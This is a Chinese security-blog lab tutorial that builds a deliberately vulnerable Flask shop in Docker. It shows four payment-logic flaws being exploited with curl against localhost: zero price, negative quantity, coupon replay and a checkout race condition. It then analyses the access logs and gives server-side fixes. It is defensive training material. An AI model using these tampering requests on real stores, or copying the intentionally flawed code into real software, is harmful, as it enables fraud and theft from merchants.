#  靶场实战 07｜前端改价直接 0 元购！电商支付漏洞全套复现（附 Docker 靶场）  
原创 安全值班室
                    安全值班室  安全值班室   2026-09-23 01:00  
  
买东西要付钱，天经地义。但很多系统在"付多少"这件事上，居然信了前端传来的数字：改金额、传负数数量、反复用优惠券，白嫖就是这么来的。今天我们自带4个支付漏洞的电商靶场走一遍。  
  
01 / 环境搭建：3分钟拉起带漏洞的电商靶场  
  
支付逻辑漏洞没有现成镜像，我们自建一个极简Flask电商：一个商品（机械键盘399元）、一张优惠券、一个余额账户，浓缩四个漏洞。  
  
一键启动命令  
```
mkdir -p ~/pay-lab && cd ~/pay-lab   # 建目录并进入，隔离实验文件
# 文件1：docker-compose.yml（编排容器，一条命令启动）
cat > docker-compose.yml <<'EOF'
services:
  pay-lab:
    image: docker.1ms.run/python:3.11-slim     # 轻量Python镜像，够用不臃肿
    ports:
      - "8082:8080"                            # 宿主机8082映射到容器8080，避开常用端口
    volumes:
      - ./app.py:/app/app.py:ro                # 挂载靶场代码，改代码后重启即生效
    command: bash -c "pip install flask -q && python /app/app.py"  # 启动时装依赖并运行
EOF
# 文件2：app.py（靶场主程序：迷你电商，故意写4个支付逻辑漏洞）
cat > app.py <<'EOF'
from flask import Flask, request, session, jsonify
import threading
app = Flask(__name__)
app.secret_key = 'lab-secret'
PRODUCTS = {
    1: {'name': '机械键盘', 'price': 399, 'stock': 5}
}
COUPONS = {
    'WELCOME88': {'amount': 100, 'used': 0}
} # 优惠券：满减100元
BALANCE = {
    'alice': 1000
} # 模拟余额
ORDERS = []
@app.route('/login')
def login():
    # 简化登录：?user=alice
    session['user'] = request.args.get('user', 'alice')
    return f'登录成功:{session["user"]}'
@app.route('/buy')
def buy():
    # 漏洞点1：金额从前端传入；漏洞点2：数量未做合法性校验
    pid = int(request.args.get('pid', 1))
    qty = int(request.args.get('qty', 1))          # 传入负数数量，服务端直接接受
    price = int(request.args.get('price', PRODUCTS[pid]['price'])) # 前端篡改单价
    total = price * qty
    return jsonify({
        '商品': PRODUCTS[pid]['name'],
        '单价': price,
        '数量': qty,
        '应付': total
    })
@app.route('/coupon')
def coupon():
    # 漏洞点3：优惠券不标记已使用，可无限重放复用
    code = request.args.get('code', '')
    c = COUPONS.get(code)
    if c:
        return jsonify({'优惠券': code, '抵扣': c['amount'], '可用': True})
    return jsonify({'可用': False}), 404
@app.route('/checkout')
def checkout():
    # 漏洞点4：余额检查与扣款非原子操作，存在竞态条件
    user = session.get('user', 'alice')
    total = int(request.args.get('total', 399))
    if BALANCE[user] >= total:
        # 先校验余额
        threading.Event().wait(0.05) # 模拟网络/数据库延迟，放大竞态窗口
        BALANCE[user] -= total       # 再执行扣款
        ORDERS.append({'user': user, 'total': total})
        return jsonify({'msg':'支付成功','余额': BALANCE[user]})
    return jsonify({'余额不足': BALANCE[user]}), 400
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
EOF
docker compose up -d                     # 一键启动，首次会自动拉取镜像
curl -s http://localhost:8082/login?user=alice  # 验证服务正常
```  
  
靶场说明：/buy计算订单金额（漏洞点1和2），/coupon核销优惠券（漏洞点3），/checkout扣款（漏洞点4）。逻辑漏洞不看花哨技术，就看服务端"信了哪个参数、漏了哪步校验"。  
  
避坑指南  
  
1. **端口冲突**  
：8082起不来，报address already in use。解决：改compose里"8082:8080"为"8083:8080"，浏览器同步访问新端口。  
  
2. **Docker权限报错**  
：permission denied while trying to connect。解决：sudo usermod -aG docker $USER后重新登录，或临时用sudo docker compose up -d。  
  
3. **镜像拉取超时**  
：python:3.11-slim拉不下来。解决：在/etc/docker/daemon.json配置registry-mirrors国内加速源后重启Docker。  
  
4. **改代码不生效**  
：app.py以只读挂载进容器，改完要docker compose restart。  
  
02 / 模拟攻击：四个白嫖姿势，一个比一个狠  
  
全程只在本地容器操作。思路：正常下单抓包 → 观察哪些参数能改 → 改完看服务端认不认。  
  
步骤1-2：改金额，399变0  
```
# 步骤1：正常买1件键盘，应付399
curl -s "http://localhost:8082/buy?pid=1&qty=1"
# 响应: {"商品": "机械键盘", "单价": 399, "数量": 1, "应付": 399}
# 步骤2：用Burp拦截改包，把 price 参数改成 0
curl -s "http://localhost:8082/buy?pid=1&qty=1&price=0"
# 响应: {"商品": "机械键盘", "单价": 0, "数量": 1, "应付": 0}
# 注意：单价和应付都变成了0！服务端直接信任前端传入的价格，造成0元购
```  
  
正常请求"应付399"，把price改成0后，服务端照单全收。因为代码里price直接取请求参数，压根没查商品表。**服务端不回查商品定价，是支付漏洞的第一大根源。**  
  
步骤3-4：改数量，负金额套现  
```
# 步骤3：数量传负数，应付变成负数
curl -s "http://localhost:8082/buy?pid=1&qty=-5&price=399"
# 响应: {"商品": "机械键盘", "单价": 399, "数量": -5, "应付": -1995}
# 负数金额在真实系统里意味着：订单金额为负 → 退款通道反入账 → 直接套现
# 步骤4：组合拳，单价1 + 数量9999
curl -s "http://localhost:8082/buy?pid=1&qty=9999&price=1"
# 响应: {"商品": "机械键盘", "单价": 1, "数量": 9999, "应付": 9999}
# 服务端没有校验商品原始价格，价格完全由客户端说了算
```  
  
qty=-5时应付变成-1995。真实系统里，负金额订单一旦进入退款流程，攻击者就能把"退款"提现到自己账户——这是抢钱。  
  
步骤5-6：优惠券无限重放  
```
# 步骤5：优惠券 WELCOME88 正常用一次
curl -s "http://localhost:8082/coupon?code=WELCOME88"
# 响应: {"优惠券": "WELCOME88", "抵扣": 100, "可用": true}
# 步骤6：同一个码重复请求10次，每次都返回可用
for i in $(seq 1 10); do
    curl -s "http://localhost:8082/coupon?code=WELCOME88"
    echo
done
# 10次全部返回可用:true —— 优惠券未标记已使用，支持无限重放复用
```  
  
同一个WELCOME88码连发10次，次次可用。问题出在核销逻辑只"查"了券存不存在，从没"标记"已用过。**查询和状态更新分离，是重放类漏洞的通用病因。**  
  
步骤7：订单竞态，余额不够也能付款  
```
# 步骤7：模拟订单竞态条件——余额1000，单笔399，3笔并发本应余额不足
# 原理：余额检查与扣款非原子操作，中间存在延迟窗口，并发请求可同时通过校验
for i in $(seq 1 3); do
    curl -s -b "session=alice" "http://localhost:8082/checkout?total=399" &
done
wait
# 若3个请求均返回"支付成功"，说明竞态条件利用成功，出现超额扣款
```  
  
余额1000，三单共1197，本只够付两单。但checkout是"先检查余额、再扣款"两步操作，中间留了时间差，三个并发请求同时挤过检查关口全部支付成功——这就是竞态条件。真实世界的秒杀超卖、重复扣款，几乎都是同一原因。  
  
03 / 日志分析：攻击在日志里长什么样  
  
下面是靶场脱敏后的访问日志（IP已打码）：  
```
# 支付漏洞靶场攻击全程访问日志（对应步骤1~7）
[REDACTED] - - [23/Aug/2026:10:01:12] "GET /login?user=alice HTTP/1.1" 200 -
[REDACTED] - - [23/Aug/2026:10:01:15] "GET /buy?pid=1&qty=1 HTTP/1.1" 200 -
[REDACTED] - - [23/Aug/2026:10:01:16] "GET /buy?pid=1&qty=1&price=0 HTTP/1.1" 200 -
[REDACTED] - - [23/Aug/2026:10:01:17] "GET /buy?pid=1&qty=-5&price=399 HTTP/1.1" 200 -
[REDACTED] - - [23/Aug/2026:10:01:19] "GET /coupon?code=WELCOME88 HTTP/1.1" 200 -
[REDACTED] - - [23/Aug/2026:10:01:19] "GET /coupon?code=WELCOME88 HTTP/1.1" 200 -
[REDACTED] - - [23/Aug/2026:10:01:19] "GET /coupon?code=WELCOME88 HTTP/1.1" 200 -
[REDACTED] - - [23/Aug/2026:10:01:21] "GET /checkout?total=399 HTTP/1.1" 200 -
[REDACTED] - - [23/Aug/2026:10:01:21] "GET /checkout?total=399 HTTP/1.1" 200 -
[REDACTED] - - [23/Aug/2026:10:01:21] "GET /checkout?total=399 HTTP/1.1" 200 -
```  
  
逐行解读：  
  
第1行：alice登录，会话建立，攻击起点。  
  
第2行：正常买1件，应付399。  
  
第3行：接口多出price=0参数——正常请求不会带，改包痕迹明显。  
  
第4行：qty=-5，数量为负数，典型参数篡改。  
  
第5-7行：同一秒内WELCOME88连用3次（实际攻击会刷几百次），核销频率异常。  
  
第8-10行：同一毫秒窗口内checkout并发3次，人工做不到，是竞态攻击特征。  
  
判断标准：哪些特征说明是真实攻击  
  
1. **参数值违背业务常识**  
：金额为0、数量为负、1元买9999件，真实订单不可能出现。  
  
2. **同一接口短时高频重复**  
：优惠券几秒内被同一用户核销N次，远超正常节奏。  
  
3. **并发时间戳几乎相同**  
：毫秒级并发人类做不到，基本是脚本在打。  
  
4. **下单金额与定价不符**  
：订单总额≠单价×数量，比对商品表直接实锤。  
  
04 / 如何防护：钱的事，服务端说了算  
  
**先讲原理。**  
支付漏洞能成功，根本原因是：服务端把"不该由客户端决定"的参数（价格、数量、优惠券状态、扣款时序）当成了可信输入。价格是经营数据，优惠券状态是数据库状态，扣款是资金操作——哪一样都不能由HTTP请求里的字符串决定。  
  
基础级（必须做）：服务端权威定价  
```
# 修复1：单价以服务端商品表为准 + 数量合法性校验（对应0元购、负数量漏洞）
@app.route('/buy')
def buy():
    pid = int(request.args.get('pid', 1))
    qty = int(request.args.get('qty', 1))
    # 数量范围校验：禁止负数、零和超大批量
    if qty <= 0 or qty > 100:
        return '数量非法', 400
    prod = PRODUCTS[pid]
    # 单价强制从服务端商品表读取，完全忽略前端传入的price参数
    total = prod['price'] * qty
    return jsonify({'应付': total})
```  
```
-- 修复2：优惠券原子标记已使用（数据库层面行锁，防重放复用）
UPDATE coupons 
SET used = 1, used_by = 'alice'
WHERE code = 'WELCOME88' AND used = 0;
-- 执行后判断影响行数：
-- 影响行数 = 1 → 核销成功
-- 影响行数 = 0 → 优惠券已被使用，拒绝本次请求
```  
  
核心三条：价格只从商品表取、数量做范围校验、优惠券用原子SQL标记已使用。成本极低，是任何电商上线前必须完成的。  
  
进阶级（推荐）：事务与幂等  
  
1. 扣款、减库存、生成订单放进同一事务，用SELECT ... FOR UPDATE行锁保证检查与扣款原子完成。  
  
2. 下单接口加幂等键：客户端每次下单带唯一流水号，服务端记录已处理过的流水号，重复请求直接拒绝，从源头消灭竞态重放。  
  
3. 订单参数做服务端签名：前端只传商品ID和数量，后端校验签名，防中间人改包。  
  
专家级（纵深防御）  
  
1. 风控引擎：对价格突变、负数量、高频核销、短时高频下单建规则实时拦截。  
  
2. 对账系统：订单、支付、退款三方每日对账，金额不平自动告警，漏洞被利用也能及时发现止损。  
  
3. 审计日志：所有资金操作留痕，可回溯可举证。  
  
4. 支付通道侧校验：以支付平台回调的实付金额为准，而非前端展示金额。  
  
05 / 总结复盘  
  
**要点提炼：**  
  
1. 支付漏洞四兄弟：改金额、改数量、优惠券重放、订单竞态，根子在"服务端信任客户端参数"。  
  
2. 价格永远从商品表取，前端传的一律忽略。  
  
3. 数量必须校验范围，负数量+退款=直接套现。  
  
4. 优惠券核销必须原子标记已使用，查询与更新不能分离。  
  
5. 涉及钱的状态变更必须事务化，不允许竞态窗口。  
  
**攻击链全景：**  
登录 → 正常下单抓包 → 修改price/qty（篡改金额）→ 重放优惠券（放大优惠）→ 并发checkout（突破余额限制）→ 极小代价拿到商品/资金。  
  
**面试可能怎么问：**  
  
Q：支付类逻辑漏洞怎么防？  
  
A：核心是服务端权威：价格从服务端取、数量范围校验、优惠券原子核销、扣款事务化加幂等键，再加风控和对账兜底。  
  
  
Q：什么是竞态条件？怎么复现和修复？  
  
A：多请求并发访问同一资源，检查与操作之间存在时间差，导致多次通过检查。复现用并发脚本打同一接口；修复用数据库行锁+事务保证原子性，或加幂等键去重。  
  
短信验证码为什么能被爆破？响应包改一个字段就"通过"？下一章《验证码绕过与接口滥用》拆解万能验证码、响应包绕过、短信轰炸，继续自建靶场开练。  
  
**关注我，下期不迷路**  
  
  
**MORE**  
  
往期回顾  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/ZNdOU6xPdJd2VWNzn1zwES9wep9zXMxpd4pzZEX5A2auqIDHXxKQu4mTJjniatK47ib7967dK4mN09zS0mUGlx3yVJdDA9Oty2xsADqJnUGT4/640?wx_fmt=gif&from=appmsg "")  
  
[CTF新手速成](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg3MzczMDc0OQ==&action=getalbum&album_id=4616106042689814529#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/ZNdOU6xPdJeAFe1tsVmCstoS3GUZ4ZjVQ4jz1Diawnx3CwB8yTlRmDGpK87xGlKVgticyM802YDmck0NdeAZb8u5IdHW2NMK3DgzSyapgiaHhg/640?wx_fmt=gif&from=appmsg "")  
  
[靶场实战：从漏洞基础到红队综合](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg3MzczMDc0OQ==&action=getalbum&album_id=4694391088487563265#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/ZNdOU6xPdJdeDc9RodEDdrwONAFutCzMLCRuQ9OArXOzQhRTMl9ALSeICh3S5pR88veNF5iaQ5MJKhSPibx156OibdfRWEls16qEiajUDZE3juE/640?wx_fmt=gif&from=appmsg "")  
  
[内网渗透学习路线](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg3MzczMDc0OQ==&action=getalbum&album_id=4572157479522107394#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/ZNdOU6xPdJfj1YSdkgqeicpsicCDlBHcAC5Q36YsAtcicZdr9WXT2gh8WDicPUbcHBoibYr5ph4LIFMJ1hibHZ8IfBSTjDkE6PfEmg4eXLnggFeQU/640?wx_fmt=gif&from=appmsg "")  
  
[云安全攻防实战连载](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg3MzczMDc0OQ==&action=getalbum&album_id=4544879677747986438#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/ZNdOU6xPdJeAFe1tsVmCstoS3GUZ4ZjVQ4jz1Diawnx3CwB8yTlRmDGpK87xGlKVgticyM802YDmck0NdeAZb8u5IdHW2NMK3DgzSyapgiaHhg/640?wx_fmt=gif&from=appmsg "")  
  
[Web安全学习路线](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg3MzczMDc0OQ==&action=getalbum&album_id=4534863005871931394#wechat_redirect)  
  
  
